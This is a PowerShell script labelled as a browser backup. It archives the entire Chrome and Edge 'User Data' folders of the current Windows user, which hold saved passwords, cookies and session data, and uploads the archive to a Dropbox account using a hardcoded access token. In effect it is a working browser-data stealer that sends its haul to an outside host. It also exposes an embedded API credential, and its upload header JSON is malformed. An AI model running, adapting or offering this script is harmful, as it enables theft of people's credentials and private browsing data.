if (-not (Test-Path "C:\Users\$env:USERNAME\Browser Backups")) {New-Item -ItemType Directory -Path "C:\Users\$env:USERNAME\BrowserBackups"}
if ( Test-Path "C:\Users\$env:USERNAME\AppData\Local\Google\Chrome\User Data" ) {
	Get-ChildItem "C:\Users\$env:USERNAME\AppData\Local\Google\Chrome\User Data" -Recurse | ForEach-Object {
		if ($_.LastWriteTime.Year -lt 1980) { $_.LastWriteTime = Get-Date "1980-01-01" }
		elseif ($_.LastWriteTime.Year -gt 2107) { $_.LastWriteTime = Get-Date "2107-12-31" }
	}

	Compress-Archive -Path (Get-ChildItem "C:\Users\$env:USERNAME\AppData\Local\Google\Chrome\User Data" -Recurse | Where-Object {
		try { $s=[System.IO.File]::Open($_.FullName,'Open','Read','None');$s.Close();$true } catch {
			$false }
	}).FullName -DestinationPath "C:\Users\$env:USERNAME\BrowserBackups\chromeBackup.zip" -ErrorAction SilentlyContinue
	#Compress-Archive -Path "C:\Users\$env:USERNAME\AppData\Local\Google\Chrome\User Data" -DestinationPath "C:\Users\$env:USERNAME\BrowserBackups\chromeBackup.zip" -ErrorAction SilentlyContinue
} else {
	Write-Host "No Chrome Data Found"
}
if ( Test-Path "C:\Users\$env:USERNAME\AppData\Local\Microsoft\Edge\User Data" ) {
	Get-ChildItem "C:\Users\$env:USERNAME\AppData\Local\Microsoft\Edge\User Data" -Recurse | ForEach-Object {
		if ($_.LastWriteTime.Year -lt 1980) { $_.LastWriteTime = Get-Date "1980-01-01" }
		elseif ($_.LastWriteTime.Year -gt 2107) { $_.LastWriteTime = Get-Date "2107-12-31" }
	}

	Compress-Archive -Path (Get-ChildItem "C:\Users\$env:USERNAME\AppData\Local\Microsoft\Edge\User Data" -Recurse | Where-Object {
		try { $s=[System.IO.File]::Open($_.FullName,'Open','Read','None');$s.Close();$true } catch {
			$false }
	}).FullName -DestinationPath "C:\Users\$env:USERNAME\BrowserBackups\msEdgeBackup.zip" -ErrorAction SilentlyContinue
	#Compress-Archive -Path "C:\Users\$env:USERNAME\AppData\Local\Microsoft\Edge\User Data" -DestinationPath "C:\Users\$env:USERNAME\BrowserBackups\msEdgeBackup.zip" -ErrorAction SilentlyContinue
} else {
	Write-Host "No Edge Data Found"
}
Compress-Archive -Path "C:\Users\$env:USERNAME\BrowserBackups" -DestinationPath "C:\Users\$env:USERNAME\Backup.zip"

$AccessToken = "sl.u.AGF59-H2jq2e75nWj1n6RvUfoz0c9PnV-JdMYStp_-ieDYPkjX-Gz1DmxQPfqkA3Oa4AkgsRQJ_Hlwt3PXj7lvmoCWCIA2hIzBbA2aDjr-tn8rZuixHIgmkdRO3WlybjqOKvk0rUd51sqvk2yGzSrsKM0hne1vi398a6-zYfQWG1yQwVV0sfx2Jx7PEdBMRG6YqkqtANYL_LAYrAt9UX6Drc9GJjrWV8uCw48W92w-8ekoQ1QCX4R1R5NN2GpsgKURg97WWNuaJ_ngt3E4t2L-s5IT8gDPyXwILY-5CvOQlWQqHRiQy2BoYWLYWwVtabF4GQtcUF1jhvQ2GWcq-CjY5mZeAAqdpAZIMRc_BEJg38sOJEjOJXRtemw5j_WekFUd25lThAHKg9CVKvSioNBZgd4mS2E_Q2XW09Tw7udDP7BTwh4NFWJOJIRvQlhm6RzUvoMxZImm64jwBHc9vJAn4jIHQLSpSqj2fGDrlKMvXRJ91MPO2t_wGYdrguPvjyr92W7bxFhTDDy2oqfGTVjSq9feM-42cocka_5H6ufMmglFvIssIF3lKFvHM4jnsEdLEE1E-Idprb1Kh9uzkQgHcl0quxZYqMQF2GkdaAo0tB2YaAS7_UJda95yzf9V1Ud3C_d4XhrTXMgmcbsp-FvpH9f0u5-bSH9WjBsqDdz_0p3PmZNR0IlKR1awGXaXSRotkh6rsIFmq27Yy-xb-IvKy9NAZTblwrc1wc7x74dCs7k3Pdb_I_7GhmwLBC2Al7btArpSfaMr34Lg_A-44pSig34baYE58TlqdAk0wAqXt9oIgL9vFsaRq-uyGxop5M_QMnFT7fCpYl9toCLHgWhWu7DcZmvSHhx7DK24TLCKfiAZVjx2dNAaJUmQHwsc6HQ_IdzigwNj8nSBl1Lz_Q-VsWg0uRB1BeXTfzh9ZwlQi_bqP_hGHwSl7e41ETH1uynh_7p-7vaK8KwX012J9PN2XVhvx6TKTow-iDTBAVv01ARE76EnCY8oPjmn6137akXPNL2Jui_wBiKLYNJf9OM3wro-TGRN2vEh9dG0fNtcJUn75WbNGWHFgK2HCTqV5AKv5624IO8o5rUn51YC0vdVsHtn-Y0QZNMpF-l60u4ka3njrSg1phrN9PpiA0rLUShKLDpS2c04_b4ayKZHcn4fxaYn5pbumcIFC9WdTvylJhKt-rz86b03UrSOaevmrRsfKRDgm-O90etH5hEbdvhTXOvXIJg-ZdpMsky74pKGv76Ns9fAxmKKnXQnL8ntG7k8sDgaCP8tIXPZ-EGfhElldf"
$FilePath = "C:\Users\$env:USERNAME\Backup.zip"
$FileName = [System.IO.Path]::GetFileName($FilePath)

$Headers = @{
	"Authorization" = "Bearer $AccessToken"
	"Dropbox-API-Arg" = '{"path:" "/' + $FileName + '","mode":"add","autorename":true,"mute":false}'
	"Content-Type" = "application/octet-stream"
}

Invoke-RestMethod -Uri "https://content.dropboxapi.com/2/files/upload" -Method Post -InFile $FilePath -Headers $Headers==
